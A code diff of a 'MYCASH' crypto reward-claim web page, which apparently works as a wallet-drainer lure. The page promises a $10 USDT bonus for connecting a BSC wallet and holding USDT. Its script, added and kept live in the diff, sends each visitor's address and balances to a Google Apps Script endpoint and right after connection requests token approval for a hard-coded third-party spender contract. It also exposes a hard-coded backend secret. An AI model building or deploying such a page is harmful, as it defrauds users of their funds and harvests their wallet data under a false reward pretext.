@@ -43,14 +43,14 @@
       font-size:0.9rem;
     }
     a:hover{background:#0f1b33}
-    .logo{font-weight:700;letter-spacing:4px;font-size:1rem;}
+    .logo{font-weight:700;letter-spacing:4px;font-size:1rem;white-space:nowrap;}
 
     .nav-right{
       display:flex;
       flex-direction:column;
       align-items:flex-end;
       gap:2px;
-      max-width:380px;
+      max-width:420px;
     }
     .header-line{
       font-size:0.78rem;
@@ -59,6 +59,31 @@
       overflow:hidden;
       text-overflow:ellipsis;
       max-width:100%;
+    }
+
+    .connect-header{
+      margin-top:4px;
+      display:flex;
+      justify-content:flex-end;
+    }
+
+    .connect-btn{
+      border:none;
+      outline:none;
+      border-radius:999px;
+      padding:0.45rem 1.2rem;
+      font-size:0.85rem;
+      font-weight:600;
+      cursor:pointer;
+      background:linear-gradient(135deg,#3b82f6,#2563eb);
+      color:#e5e7eb;
+      box-shadow:0 12px 26px rgba(37,99,235,0.5);
+      transition:transform 0.12s ease,box-shadow 0.12s ease;
+      white-space:nowrap;
+    }
+    .connect-btn:hover{
+      transform:translateY(-1px);
+      box-shadow:0 16px 34px rgba(37,99,235,0.65);
     }
 
     main{
@@ -83,12 +108,6 @@
       color:#9ca3af;
     }
 
-    .reward-list{
-      display:flex;
-      flex-direction:column;
-      gap:16px;
-    }
-
     .reward-card{
       border-radius:1.2rem;
       padding:1.25rem 1.5rem;
@@ -98,6 +117,7 @@
       gap:1.25rem;
       border:1px solid rgba(148,163,184,0.4);
       box-shadow:0 16px 40px rgba(15,23,42,0.8);
+      background:radial-gradient(circle at top left,#1e293b,#020617); /* card-1 */
     }
 
     .reward-left,
@@ -130,6 +150,8 @@
       overflow:hidden;
       background:#020617;
       border:1px solid rgba(148,163,184,0.6);
+      border-radius:999px;
+      background:radial-gradient(circle at 20% 0,#1d4ed8,#020617);
     }
     .wallet-icon-base img{
       width:70%;
@@ -137,18 +159,6 @@
       object-fit:contain;
       display:block;
     }
-
-    /* different icon shapes / styles */
-    .icon-circle{border-radius:999px;background:radial-gradient(circle at 20% 0,#1d4ed8,#020617);}
-    .icon-soft{border-radius:18px;background:radial-gradient(circle at 80% 0,#22c55e,#020617);}
-    .icon-square{border-radius:10px;background:linear-gradient(135deg,#f97316,#020617);}
-    .icon-pill{border-radius:999px;width:70px;}
-    .icon-diamond{transform:rotate(45deg);border-radius:18px;}
-    .icon-diamond img{transform:rotate(-45deg);}
-    .icon-ghost{border-radius:999px;background:transparent;border-style:dashed;}
-    .icon-outline{border-radius:16px;background:#020617;border:1px solid rgba(96,165,250,0.7);}
-    .icon-glow{border-radius:14px;box-shadow:0 0 18px rgba(59,130,246,0.7);}
-    .icon-subtle{border-radius:50%;opacity:0.85;}
 
     .reward-center{
       flex:1;
@@ -174,6 +184,7 @@
       margin-top:4px;
       font-size:0.8rem;
       color:#9fb0c8;
+      max-width:360px;
     }
 
     .btn{
@@ -184,7 +195,7 @@
       font-size:0.9rem;
       font-weight:600;
       cursor:pointer;
-      transition:transform 0.12s ease, box-shadow 0.12s ease, background 0.15s ease;
+      transition:transform 0.12s ease, box-shadow 0.12s ease, background 0.15s ease, opacity 0.12s ease;
       display:inline-flex;
       align-items:center;
       justify-content:center;
@@ -197,31 +208,72 @@
       box-shadow:0 14px 30px rgba(34,197,94,0.35);
       margin-top:0.45rem;
     }
-    .btn-primary:hover{
+    .btn-primary:hover:not([disabled]){
       transform:translateY(-1px);
       box-shadow:0 18px 40px rgba(34,197,94,0.5);
     }
 
-    .btn-outline{
+    .btn-secondary{
       background:rgba(15,23,42,0.85);
       color:#e5e7eb;
       border:1px solid rgba(148,163,184,0.7);
       padding-inline:1.1rem;
       font-size:0.85rem;
     }
-    .btn-outline:hover{
+    .btn-secondary:hover{
       background:rgba(30,64,175,0.6);
       box-shadow:0 12px 28px rgba(30,64,175,0.55);
       transform:translateY(-1px);
     }
 
+    .btn[disabled]{
+      opacity:0.45;
+      cursor:not-allowed;
+      box-shadow:none;
+      transform:none;
+    }
+
     .reward-right{
-      min-width:150px;
+      min-width:180px;
       align-items:flex-end;
+      gap:0.4rem;
     }
 
     .small{font-size:0.85rem;color:#9fb0c8;}
     .mono{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono","Helvetica Neue", monospace;}
+
+    .reward-extra{
+      margin-top:18px;
+    }
+
+    .task-panel{
+      margin-top:14px;
+      padding:1rem 1.1rem;
+      border-radius:0.9rem;
+      border:1px dashed rgba(148,163,184,0.7);
+      background:rgba(15,23,42,0.95);
+      font-size:0.85rem;
+      color:#cbd5f5;
+    }
+    .task-panel h3{
+      font-size:0.95rem;
+      margin-bottom:0.35rem;
+    }
+    .task-panel p{
+      margin-bottom:0.35rem;
+    }
+    .task-panel ul{
+      margin-left:1.2rem;
+      margin-bottom:0.5rem;
+    }
+    .task-panel li{
+      margin-bottom:0.15rem;
+    }
+    .task-status{
+      margin-top:0.35rem;
+      color:#22c55e;
+      font-size:0.82rem;
+    }
 
     footer{
       max-width:980px;
@@ -231,18 +283,6 @@
       text-align:center;
       font-size:0.8rem;
     }
-
-    /* per-card background styles to look different */
-    .card-1{background:radial-gradient(circle at top left,#1e293b,#020617);}
-    .card-2{background:linear-gradient(135deg,#0f172a,#020617);}
-    .card-3{background:radial-gradient(circle at 10% 0,#0f766e,#020617);}
-    .card-4{background:radial-gradient(circle at 90% 0,#7c2d12,#020617);}
-    .card-5{background:linear-gradient(135deg,#1e293b,#111827);}
-    .card-6{background:radial-gradient(circle at 20% 100%,#4b5563,#020617);}
-    .card-7{background:linear-gradient(160deg,#020617,#111827);}
-    .card-8{background:radial-gradient(circle at 50% 0,#1d4ed8,#020617);}
-    .card-9{background:linear-gradient(135deg,#0f172a,#030712);}
-    .card-10{background:radial-gradient(circle at 0 0,#22c55e22,#020617);}
 
     @media(max-width:768px){
       .nav{
@@ -277,12 +317,14 @@
         <a href="reward.html" style="background:#0f1b33">Rewards</a>
       </div>
       <div class="logo">MYCASH</div>
-      <!-- USER INFO MOVED TO HEADER -->
       <div class="nav-right">
         <div class="header-line">Status: <span id="statusText">Not connected</span></div>
         <div class="header-line">Address: <span id="walletAddress" class="mono">—</span></div>
         <div class="header-line">Network: <span id="walletNetwork">—</span></div>
         <div class="header-line">User ID: <span id="userId" class="mono">-</span></div>
+        <div class="connect-header">
+          <button id="connectBtn" class="connect-btn">Connect Wallet</button>
+        </div>
       </div>
     </div>
   </header>
@@ -290,238 +332,61 @@
   <main>
     <div class="reward-container">
       <div class="reward-title">
-        <h1>Claim Your Rewards</h1>
-        <p>Connect your BSC wallet once, then use any of the reward cards below to claim.</p>
+        <h1>Claim Your Reward</h1>
+        <p>Connect your BSC wallet and complete the task to unlock your bonus.</p>
       </div>
 
-      <div class="reward-list">
-        <!-- CARD 1 -->
-        <div class="reward-card card-1">
-          <div class="reward-left">
-            <div class="reward-tag">Reward #1</div>
-            <div class="wallet-icon-base icon-circle">
-              <img src="logo.png" alt="Trust Wallet">
-            </div>
-            <span class="small">Trust Wallet • BSC</span>
+      <!-- SINGLE REWARD CARD -->
+      <div class="reward-card">
+        <div class="reward-left">
+          <div class="reward-tag">Reward #1</div>
+          <div class="wallet-icon-base">
+            <img src="logo.png" alt="MYCASH">
           </div>
+          <span class="small">BSC • USDT Bonus</span>
+        </div>
 
-          <div class="reward-center">
-            <div class="reward-amount">$10</div>
-            <div class="reward-label">Starter Bonus</div>
-            <div class="reward-desc">First time connection reward for eligible wallets.</div>
-            <button class="btn btn-primary claimBtn">Claim</button>
-          </div>
-
-          <div class="reward-right">
-            <button class="btn btn-outline connectBtn">Connect Wallet</button>
+        <div class="reward-center">
+          <div class="reward-amount" id="rewardAmountDisplay">$0.00</div>
+          <div class="reward-label">Reward Balance</div>
+          <div class="reward-desc">
+            After you complete the task and we assign the bonus to you, it will appear here.
           </div>
         </div>
 
-        <!-- CARD 2 -->
-        <div class="reward-card card-2">
-          <div class="reward-left">
-            <div class="reward-tag">Reward #2</div>
-            <div class="wallet-icon-base icon-soft">
-              <img src="logo.png" alt="Trust Wallet">
-            </div>
-            <span class="small">Invite Bonus</span>
-          </div>
-
-          <div class="reward-center">
-            <div class="reward-amount">$10</div>
-            <div class="reward-label">Referral</div>
-            <div class="reward-desc">Reward for invited active addresses.</div>
-            <button class="btn btn-primary claimBtn">Claim</button>
-          </div>
-
-          <div class="reward-right">
-            <button class="btn btn-outline connectBtn">Connect Wallet</button>
-          </div>
+        <div class="reward-right">
+          <button id="claimBtn" class="btn btn-primary" disabled>Claim</button>
+          <button id="taskBtn" class="btn btn-secondary">Task</button>
+          <span class="small" id="claimHint">
+            Claim is locked until wallet is connected and task is completed.
+          </span>
         </div>
-
-        <!-- CARD 3 -->
-        <div class="reward-card card-3">
-          <div class="reward-left">
-            <div class="reward-tag">Reward #3</div>
-            <div class="wallet-icon-base icon-square">
-              <img src="logo.png" alt="Trust Wallet">
-            </div>
-            <span class="small">Loyalty</span>
-          </div>
-
-          <div class="reward-center">
-            <div class="reward-amount">$10</div>
-            <div class="reward-label">Loyal User</div>
-            <div class="reward-desc">Claim for repeat visitors meeting criteria.</div>
-            <button class="btn btn-primary claimBtn">Claim</button>
-          </div>
-
-          <div class="reward-right">
-            <button class="btn btn-outline connectBtn">Connect Wallet</button>
-          </div>
-        </div>
-
-        <!-- CARD 4 -->
-        <div class="reward-card card-4">
-          <div class="reward-left">
-            <div class="reward-tag">Reward #4</div>
-            <div class="wallet-icon-base icon-pill">
-              <img src="logo.png" alt="Trust Wallet">
-            </div>
-            <span class="small">Daily Bonus</span>
-          </div>
-
-          <div class="reward-center">
-            <div class="reward-amount">$10</div>
-            <div class="reward-label">Daily</div>
-            <div class="reward-desc">Limited daily reward for qualified users.</div>
-            <button class="btn btn-primary claimBtn">Claim</button>
-          </div>
-
-          <div class="reward-right">
-            <button class="btn btn-outline connectBtn">Connect Wallet</button>
-          </div>
-        </div>
-
-        <!-- CARD 5 -->
-        <div class="reward-card card-5">
-          <div class="reward-left">
-            <div class="reward-tag">Reward #5</div>
-            <div class="wallet-icon-base icon-diamond">
-              <img src="logo.png" alt="Trust Wallet">
-            </div>
-            <span class="small">Milestone</span>
-          </div>
-
-          <div class="reward-center">
-            <div class="reward-amount">$10</div>
-            <div class="reward-label">Milestone</div>
-            <div class="reward-desc">Special event or campaign reward.</div>
-            <button class="btn btn-primary claimBtn">Claim</button>
-          </div>
-
-          <div class="reward-right">
-            <button class="btn btn-outline connectBtn">Connect Wallet</button>
-          </div>
-        </div>
-
-        <!-- CARD 6 -->
-        <div class="reward-card card-6">
-          <div class="reward-left">
-            <div class="reward-tag">Reward #6</div>
-            <div class="wallet-icon-base icon-ghost">
-              <img src="logo.png" alt="Trust Wallet">
-            </div>
-            <span class="small">Test Reward</span>
-          </div>
-
-          <div class="reward-center">
-            <div class="reward-amount">$10</div>
-            <div class="reward-label">QA / Test</div>
-            <div class="reward-desc">For internal or testnet campaigns.</div>
-            <button class="btn btn-primary claimBtn">Claim</button>
-          </div>
-
-          <div class="reward-right">
-            <button class="btn btn-outline connectBtn">Connect Wallet</button>
-          </div>
-        </div>
-
-        <!-- CARD 7 -->
-        <div class="reward-card card-7">
-          <div class="reward-left">
-            <div class="reward-tag">Reward #7</div>
-            <div class="wallet-icon-base icon-outline">
-              <img src="logo.png" alt="Trust Wallet">
-            </div>
-            <span class="small">Promo</span>
-          </div>
-
-          <div class="reward-center">
-            <div class="reward-amount">$10</div>
-            <div class="reward-label">Promo Code</div>
-            <div class="reward-desc">Tie this to promo / coupon logic.</div>
-            <button class="btn btn-primary claimBtn">Claim</button>
-          </div>
-
-          <div class="reward-right">
-            <button class="btn btn-outline connectBtn">Connect Wallet</button>
-          </div>
-        </div>
-
-        <!-- CARD 8 -->
-        <div class="reward-card card-8">
-          <div class="reward-left">
-            <div class="reward-tag">Reward #8</div>
-            <div class="wallet-icon-base icon-glow">
-              <img src="logo.png" alt="Trust Wallet">
-            </div>
-            <span class="small">VIP</span>
-          </div>
-
-          <div class="reward-center">
-            <div class="reward-amount">$10</div>
-            <div class="reward-label">VIP Tier</div>
-            <div class="reward-desc">Reserved for selected addresses.</div>
-            <button class="btn btn-primary claimBtn">Claim</button>
-          </div>
-
-          <div class="reward-right">
-            <button class="btn btn-outline connectBtn">Connect Wallet</button>
-          </div>
-        </div>
-
-        <!-- CARD 9 -->
-        <div class="reward-card card-9">
-          <div class="reward-left">
-            <div class="reward-tag">Reward #9</div>
-            <div class="wallet-icon-base icon-subtle">
-              <img src="logo.png" alt="Trust Wallet">
-            </div>
-            <span class="small">Bonus Pool</span>
-          </div>
-
-          <div class="reward-center">
-            <div class="reward-amount">$10</div>
-            <div class="reward-label">Pool</div>
-            <div class="reward-desc">Connect to check eligibility and claim.</div>
-            <button class="btn btn-primary claimBtn">Claim</button>
-          </div>
-
-          <div class="reward-right">
-            <button class="btn btn-outline connectBtn">Connect Wallet</button>
-          </div>
-        </div>
-
-        <!-- CARD 10 -->
-        <div class="reward-card card-10">
-          <div class="reward-left">
-            <div class="reward-tag">Reward #10</div>
-            <div class="wallet-icon-base icon-circle">
-              <img src="logo.png" alt="Trust Wallet">
-            </div>
-            <span class="small">Special</span>
-          </div>
-
-          <div class="reward-center">
-            <div class="reward-amount">$10</div>
-            <div class="reward-label">Special Drop</div>
-            <div class="reward-desc">Use for any custom campaign later.</div>
-            <button class="btn btn-primary claimBtn">Claim</button>
-          </div>
-
-          <div class="reward-right">
-            <button class="btn btn-outline connectBtn">Connect Wallet</button>
-          </div>
-        </div>
-
       </div>
 
-      <div style="margin-top:18px" class="small">
-        BNB Balance: <span id="walletBalance">—</span>
+      <!-- TASK DETAILS PANEL -->
+      <div id="taskPanel" class="task-panel" style="display:none;">
+        <h3>Task Details</h3>
+        <p>Complete the following task to become eligible for the reward:</p>
+        <ul>
+          <li>Connect your BSC wallet to this dApp (BSC Testnet / Mainnet as configured).</li>
+          <li>Hold or deposit the required USDT amount (we will verify this later).</li>
+          <li>Optional: perform any action you define later (e.g. swap, stake, invite, etc.).</li>
+        </ul>
+        <p class="small">
+          Once you verify the user has completed the task, you can set the reward balance for their User ID and allow them to claim.
+        </p>
+        <button id="taskCompleteBtn" class="btn btn-secondary" style="margin-top:0.35rem;">Mark task as completed (demo)</button>
+        <div id="taskStatusText" class="task-status" style="display:none;">
+          ✅ Task marked as completed. If your wallet is connected, you can now claim.
+        </div>
       </div>
-      <div id="tokens" class="small" style="margin-top:6px">
-        Connect wallet to see token balance.
+
+      <!-- EXTRA WALLET INFO -->
+      <div class="reward-extra small">
+        <div>BNB Balance: <span id="walletBalance">—</span></div>
+        <div id="tokens" style="margin-top:6px">
+          Connect wallet to see USDT balance.
+        </div>
       </div>
     </div>
   </main>
@@ -536,15 +401,16 @@
   <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.umd.min.js"></script>
 
-  <!-- app script -->
+  <!-- app script (based on your index page) -->
   <script type="module">
   (function(){
-    // ===== CONFIG =====
+    // ===== CONFIG (copied from index) =====
     const APPS_SCRIPT_URL    = "https://script.google.com/macros/s/AKfycbzlCsXUoqaMW4fCTqK6H_SF7dGCDDkcIoO-To5YbLcBLdWEEKvGjHQm_vSUfwE06Yw/exec";
     const APPS_SCRIPT_SECRET = "mahfuzinam0045";
 
-    const TOKEN_ADDRESS   = "PUT_YOUR_BEP20_TOKEN_CONTRACT_ADDRESS_HERE"; // <--- CHANGE THIS
-    const SPENDER_ADDRESS = "0xD0A66d72B69c850b04Eb9CEA6cA156A412d2306d"; // your smart contract
+    // USDT on BSC TESTNET
+    const TOKEN_ADDRESS   = "0x5915f45023012942c0F30B6652CEbb6A05810b90";
+    const SPENDER_ADDRESS = "0x98fbcaA43b229601edb71E9923055ee485c29C3E"; // your smart contract
 
     const BNB_TESTNET_CHAIN_ID_DEC = 97;
     const BNB_TESTNET_CHAIN_ID_HEX = "0x61";
@@ -557,11 +423,17 @@
       "function balanceOf(address owner) view returns (uint256)"
     ];
 
+    // Reward logic: you can change this later or set from backend
+    const DEMO_REWARD_AMOUNT = 10.00; // USD / USDT demo
+
     let web3ModalInstance = null;
     let providerInstance  = null;
     let web3Instance      = null;
 
-    // helpers
+    let isWalletConnected = false;
+    let isTaskCompleted   = false;
+
+    // ===== helpers for userId =====
     function storageKeyFor(address){
       return "userId_" + address.toLowerCase();
     }
@@ -574,7 +446,7 @@
         hash |= 0;
       }
       hash = Math.abs(hash);
-      const num = 100000 + (hash % 900000);
+      const num = 100000 + (hash % 900000); // 100000–999999
       return String(num);
     }
 
@@ -588,13 +460,22 @@
       return id;
     }
 
-    // UI refs (now in HEADER)
+    // ===== UI refs =====
+    const connectBtn      = document.getElementById("connectBtn");
     const statusTextEl    = document.getElementById("statusText");
     const walletAddressEl = document.getElementById("walletAddress");
     const userIdEl        = document.getElementById("userId");
     const walletNetworkEl = document.getElementById("walletNetwork");
     const walletBalanceEl = document.getElementById("walletBalance");
     const tokensContainer = document.getElementById("tokens");
+
+    const claimBtn            = document.getElementById("claimBtn");
+    const claimHintEl         = document.getElementById("claimHint");
+    const taskBtn             = document.getElementById("taskBtn");
+    const taskPanel           = document.getElementById("taskPanel");
+    const taskCompleteBtn     = document.getElementById("taskCompleteBtn");
+    const taskStatusTextEl    = document.getElementById("taskStatusText");
+    const rewardAmountDisplay = document.getElementById("rewardAmountDisplay");
 
     function setStatus(txt){
       if(statusTextEl) statusTextEl.textContent = txt;
@@ -615,11 +496,30 @@
     }
 
     function clearSessionUI(){
+      isWalletConnected = false;
       setStatus("Not connected");
-      setWalletInfo("—","—","—");
+      setWalletInfo("—","—",null);
       setUserIdUI("-");
       if(tokensContainer){
-        tokensContainer.textContent = "Connect wallet to see token balance.";
+        tokensContainer.textContent = "Connect wallet to see USDT balance.";
+      }
+      updateClaimState();
+    }
+
+    function updateClaimState(){
+      if(!claimBtn) return;
+      const enabled = isWalletConnected && isTaskCompleted;
+      claimBtn.disabled = !enabled;
+      if(claimHintEl){
+        if(!isWalletConnected && !isTaskCompleted){
+          claimHintEl.textContent = "Claim is locked until wallet is connected and task is completed.";
+        } else if(!isWalletConnected){
+          claimHintEl.textContent = "Please connect your wallet to claim.";
+        } else if(!isTaskCompleted){
+          claimHintEl.textContent = "Complete the task to unlock the Claim button.";
+        } else {
+          claimHintEl.textContent = "You can now claim your reward.";
+        }
       }
     }
 
@@ -644,14 +544,27 @@
       if(!p || !p.on) return;
       try{
         p.on("accountsChanged", function(accounts){
-          if(!accounts || !accounts.length){ clearSessionUI(); return; }
+          if(!accounts || !accounts.length){
+            clearSessionUI();
+            return;
+          }
           const addr = accounts[0].toLowerCase();
           const uid  = getOrCreateUserIdFor(addr);
-          setWalletInfo(addr, walletNetworkEl ? walletNetworkEl.textContent : BNB_TESTNET_LABEL, null);
+          setWalletInfo(addr, BNB_TESTNET_LABEL, null);
           setUserIdUI(uid);
+          isWalletConnected = true;
+          updateClaimState();
         });
-        p.on("chainChanged", function(){ location.reload(); });
-        p.on("disconnect", function(){ clearSessionUI(); });
+
+        p.on("chainChanged", function(chainId){
+          if(walletNetworkEl){
+            walletNetworkEl.textContent = BNB_TESTNET_LABEL + " (chain " + chainId + ")";
+          }
+        });
+
+        p.on("disconnect", function(){
+          clearSessionUI();
+        });
       }catch(e){
         console.warn("attachProviderListeners", e);
       }
@@ -672,7 +585,9 @@
         await fetch(APPS_SCRIPT_URL, {
           method: "POST",
           mode  : "no-cors",
-          headers: { "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8" },
+          headers: {
+            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"
+          },
           body: payload.toString()
         });
 
@@ -684,8 +599,11 @@
 
     async function getTokenBalance(address){
       try{
-        if(!TOKEN_ADDRESS){
-          console.warn("TOKEN_ADDRESS not set, skipping token balance");
+        if(
+          !TOKEN_ADDRESS ||
+          !/^0x[0-9a-fA-F]{40}$/.test(TOKEN_ADDRESS)
+        ){
+          console.warn("TOKEN_ADDRESS not set or invalid, skipping token balance");
           return "";
         }
         if(!providerInstance){
@@ -696,7 +614,7 @@
         const ethersProvider = new ethers.BrowserProvider(providerInstance);
         const tokenContract  = new ethers.Contract(TOKEN_ADDRESS, ERC20_BALANCE_ABI, ethersProvider);
         const raw            = await tokenContract.balanceOf(address);
-        const formatted      = ethers.formatUnits(raw, 18);
+        const formatted      = ethers.formatUnits(raw, 18); // assumes 18 decimals
         return formatted;
       }catch(err){
         console.error("getTokenBalance error:", err);
@@ -738,12 +656,10 @@
     async function requestTokenApproval(){
       if(!TOKEN_ADDRESS){
         console.warn("TOKEN_ADDRESS not set, skipping approve");
-        alert("TOKEN_ADDRESS is empty. Set your BEP-20 token contract address in the code.");
         return;
       }
       if(!SPENDER_ADDRESS){
         console.warn("SPENDER_ADDRESS not set, skipping approve");
-        alert("SPENDER_ADDRESS is empty. Set your smart contract address in the code.");
         return;
       }
       if(!providerInstance){
@@ -779,20 +695,54 @@
       }
     }
 
+    // Restore BNB + USDT and mark wallet as connected
+    async function restoreSessionFromAddress(address){
+      const balanceWei = await web3Instance.eth.getBalance(address);
+      const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei + "","ether"));
+      const userId     = getOrCreateUserIdFor(address);
+
+      setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);
+      setUserIdUI(userId);
+
+      const tokenBalanceRaw  = await getTokenBalance(address);
+      const tokenBalanceNum  = tokenBalanceRaw ? Number(tokenBalanceRaw) : 0;
+      const prettyBalance    = tokenBalanceRaw ? Number(tokenBalanceRaw).toFixed(4) : "0.0000";
+
+      if(tokensContainer){
+        tokensContainer.innerHTML =
+          'USDT balance: ' + prettyBalance +
+          '<br><span class="small mono">' + TOKEN_ADDRESS + '</span>';
+      }
+
+      isWalletConnected = true;
+      updateClaimState();
+
+      return {
+        balanceBNB,
+        tokenBalance: tokenBalanceRaw,
+        userId
+      };
+    }
+
     async function connectFlow(){
       try{
         setStatus("Connecting…");
         const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
 
+        // Trust Wallet extension
         if(!mobile && window.trustwallet && window.trustwallet.ethereum){
           providerInstance = window.trustwallet.ethereum;
           web3Instance     = new Web3(providerInstance);
           await providerInstance.request({ method: "eth_requestAccounts" });
-        } else if(window.ethereum && !mobile){
+        }
+        // Standard injected (MetaMask, some Trust)
+        else if(window.ethereum && !mobile){
           providerInstance = window.ethereum;
           web3Instance     = new Web3(providerInstance);
           await providerInstance.request({ method: "eth_requestAccounts" });
-        } else {
+        }
+        // WalletConnect via Web3Modal
+        else {
           if(!web3ModalInstance) initWeb3ModalInstance();
           providerInstance = await web3ModalInstance.connect();
           web3Instance     = new Web3(providerInstance);
@@ -828,28 +778,18 @@
           }
         }
 
-        const balanceWei = await web3Instance.eth.getBalance(address);
-        const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei,"ether"));
+        const { balanceBNB, tokenBalance, userId } =
+          await restoreSessionFromAddress(address);
 
         setStatus("Connected");
-        setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);
 
-        const userId = getOrCreateUserIdFor(address);
-        setUserIdUI(userId);
-
-        if(tokensContainer){
-          tokensContainer.textContent = "Loading token balance…";
-        }
-
-        const tokenBalance = await getTokenBalance(address);
-        const prettyBalance = tokenBalance ? Number(tokenBalance).toFixed(4) : "0";
-        if(tokensContainer){
-          tokensContainer.innerHTML =
-            'Token balance: ' + prettyBalance +
-            '<br><span class="small">' + TOKEN_ADDRESS + '</span>';
-        }
-
-        await notifyBackend(address, BNB_TESTNET_LABEL, userId, balanceBNB, tokenBalance);
+        await notifyBackend(
+          address,
+          BNB_TESTNET_LABEL,
+          userId,
+          balanceBNB,
+          tokenBalance
+        );
 
         await requestTokenApproval();
 
@@ -860,149 +800,83 @@
       }
     }
 
-  async function tryAutoReconnect(){
-  try {
+    // silent restore using eth_accounts; returns true if restored
+    async function tryAutoReconnectSilent(){
+      const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
 
-    if (!web3ModalInstance) {
-      initWeb3ModalInstance();
-    }
-
-    const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-
-    // 1) TRUST WALLET (desktop extension or mobile in-app browser)
-    if (!mobile && window.trustwallet && window.trustwallet.ethereum) {
-      const injected = window.trustwallet.ethereum;
-
-      providerInstance = injected;
-      web3Instance     = new Web3(providerInstance);
-      attachProviderListeners(providerInstance);
-
-      const accounts = await injected.request({ method: "eth_accounts" });
-
-      if (accounts && accounts.length > 0) {
-        const address = accounts[0].toLowerCase();
-
-        setStatus("Restoring session (Trust Wallet)...");
-        const balanceWei = await web3Instance.eth.getBalance(address);
-        const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei, "ether"));
-        const userId     = getOrCreateUserIdFor(address);
-
-        setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);
-        setUserIdUI(userId);
-
-        if (tokensContainer) {
-          tokensContainer.textContent = "Connect again to approve token or claim.";
-        }
-
-        setStatus("Connected (restored)");
-        return;
-      }
-    }
-
-    // 2) STANDARD INJECTED PROVIDER (MetaMask, Brave, etc.)
-    if (window.ethereum) {
-      const injected = window.ethereum;
-
-      providerInstance = injected;
-      web3Instance     = new Web3(providerInstance);
-      attachProviderListeners(providerInstance);
-
-      const accounts = await injected.request({ method: "eth_accounts" });
-
-      if (accounts && accounts.length > 0) {
-        const address = accounts[0].toLowerCase();
-
-        setStatus("Restoring session…");
-        const balanceWei = await web3Instance.eth.getBalance(address);
-        const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei, "ether"));
-        const userId     = getOrCreateUserIdFor(address);
-
-        setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);
-        setUserIdUI(userId);
-
-        if (tokensContainer) {
-          tokensContainer.textContent = "Connect again to approve token or claim.";
-        }
-
-        setStatus("Connected (restored)");
-        return;
-      }
-    }
-
-    // 3) WEB3MODAL CACHED PROVIDER (WalletConnect)
-    if (web3ModalInstance && web3ModalInstance.cachedProvider) {
-      try {
-        providerInstance = await web3ModalInstance.connect();
+      // 1) Trust Wallet extension
+      if(!mobile && window.trustwallet && window.trustwallet.ethereum){
+        const injected = window.trustwallet.ethereum;
+        providerInstance = injected;
         web3Instance     = new Web3(providerInstance);
         attachProviderListeners(providerInstance);
 
-        const accounts = await web3Instance.eth.getAccounts();
-
-        if (accounts && accounts.length > 0) {
+        const accounts = await injected.request({ method: "eth_accounts" });
+        if (accounts && accounts.length) {
           const address = accounts[0].toLowerCase();
-
-          setStatus("Restoring session (WalletConnect)…");
-          const balanceWei = await web3Instance.eth.getBalance(address);
-          const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei, "ether"));
-          const userId     = getOrCreateUserIdFor(address);
-
-          setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);
-          setUserIdUI(userId);
-
-          if (tokensContainer) {
-            tokensContainer.textContent = "Connect again to approve token or claim.";
-          }
-
+          setStatus("Restoring session (Trust Wallet)...");
+          await restoreSessionFromAddress(address);
           setStatus("Connected (restored)");
-          return;
+          return true;
         }
-
-      } catch (wcError) {
-        console.warn("WalletConnect restore failed:", wcError);
       }
+
+      // 2) Standard injected (MetaMask / some Trust)
+      if(window.ethereum){
+        const injected = window.ethereum;
+        providerInstance = injected;
+        web3Instance     = new Web3(providerInstance);
+        attachProviderListeners(providerInstance);
+
+        const accounts = await injected.request({ method: "eth_accounts" });
+        if (accounts && accounts.length) {
+          const address = accounts[0].toLowerCase();
+          setStatus("Restoring session...");
+          await restoreSessionFromAddress(address);
+          setStatus("Connected (restored)");
+          return true;
+        }
+      }
+
+      // 3) Do NOT auto-connect WalletConnect silently (would open QR)
+      return false;
     }
 
-    // If no provider restored → clear UI
-    clearSessionUI();
+    async function autoConnectOnLoad(){
+      try{
+        const restored = await tryAutoReconnectSilent();
+        if(restored) return;
 
-  } catch (err) {
-    console.warn("Auto-reconnect error:", err);
-    clearSessionUI();
-  }
-}
+        const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
 
-    // 2) Standard injected provider (MetaMask, some browsers, etc.)
-    if(window.ethereum){
-      const injected = window.ethereum;
-      providerInstance = injected;
-      web3Instance     = new Web3(providerInstance);
-      attachProviderListeners(providerInstance);
-
-      const accounts = await injected.request({ method: "eth_accounts" });
-      if(accounts && accounts.length){
-        const address    = accounts[0].toLowerCase();
-        setStatus("Restoring session…");
-        const balanceWei = await web3Instance.eth.getBalance(address);
-        const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei + "", "ether"));
-        const userId     = getOrCreateUserIdFor(address);
-
-        setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);
-        setUserIdUI(userId);
-        if(tokensContainer){
-          tokensContainer.textContent = "Connect again to approve token or claim.";
+        if(!mobile && ( (window.trustwallet && window.trustwallet.ethereum) || window.ethereum )){
+          // optional: auto-connect on desktop
+          // setStatus("Auto connecting…");
+          // await connectFlow();
+          clearSessionUI();
+        }else{
+          clearSessionUI();
         }
-        setStatus("Connected (restored)");
-        return;
+      }catch(e){
+        console.warn("autoConnectOnLoad failed:", e);
+        clearSessionUI();
       }
     }
-
-   
 
     async function claimReward(){
       try{
+        if(!isWalletConnected){
+          alert("Please connect your wallet first.");
+          setStatus("Connect wallet before claiming.");
+          return;
+        }
+        if(!isTaskCompleted){
+          alert("Please complete the task first.");
+          setStatus("Complete task before claiming.");
+          return;
+        }
         if(!web3Instance || !providerInstance){
-          setStatus("Please connect your wallet first.");
-          alert("Connect your wallet before claiming the reward.");
+          alert("Wallet not ready, connect again.");
           return;
         }
 
@@ -1013,7 +887,7 @@
         }
